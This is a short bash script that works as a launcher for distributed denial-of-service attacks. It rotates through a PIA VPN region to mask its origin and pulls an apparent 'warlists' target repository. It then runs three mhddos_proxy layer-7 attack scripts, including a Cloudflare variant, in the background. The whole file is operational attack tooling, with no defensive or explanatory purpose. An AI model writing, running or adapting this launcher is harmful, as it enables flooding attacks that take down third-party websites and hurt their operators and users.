#!/usr/bin/env bash

export PATH="/opt/venv/bin:$PATH"

killall -9 python3

killall openvpn
sleep "$(shuf -i 1-30 -n 1)"

set -e

cd /opt/pia/
PIA_DNS='false' PIA_PF='false' VPN_PROTOCOL='openvpn_udp_standard' DISABLE_IPV6='yes' \
PREFERRED_REGION="$(shuf -n 1 /config/regions | sed -e 's/\r//' | sed -e 's/\n//')" \
/opt/pia/run_setup.sh

echo -e "$(curl 'https://api.my-ip.io/ip' 2> /dev/null)\n"

cd /opt/warlists && git pull

cd /opt/mhddos_proxy
/opt/warlists/scripts/run_l7.sh &>>/var/log/ptndown.log &
/opt/warlists/scripts/run_l7_cf.sh &>>/var/log/ptndown.log &
/opt/warlists/scripts/run_l7_get-stress.sh &>>/var/log/ptndown.log &
